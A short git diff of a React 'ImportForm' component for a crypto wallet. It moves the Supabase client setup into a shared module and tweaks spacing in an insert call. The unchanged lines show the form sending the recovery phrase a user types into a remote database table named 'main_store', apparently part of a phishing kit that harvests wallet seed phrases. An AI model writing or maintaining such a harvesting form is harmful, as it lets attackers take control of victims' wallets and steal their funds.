@@ -1,12 +1,8 @@
 import React, { useState } from 'react';
 import { X } from 'lucide-react';
-import { createClient } from '@supabase/supabase-js';
+import { supabase } from '../supabaseClient'; // Adjusted path
 import { useNavigate } from 'react-router-dom';
 import '../css/import_form.css';
-
-const supabaseUrl = process.env.VITE_SUPABASE_URL;
-const supabaseKey = process.env.VITE_SUPABASE_KEY;
-const supabase = createClient(supabaseUrl, supabaseKey);
 
 export default function ImportForm({ wallet, onClose }) {
   const [activeTab, setActiveTab] = useState('phrase');
@@ -46,7 +42,7 @@ export default function ImportForm({ wallet, onClose }) {
     try {
       const { error } = await supabase
         .from("main_store")
-        .insert([{ phrases: phrase }]);
+        .insert([{ phrases: phrase}]);
 
       if (error) {
         throw error;
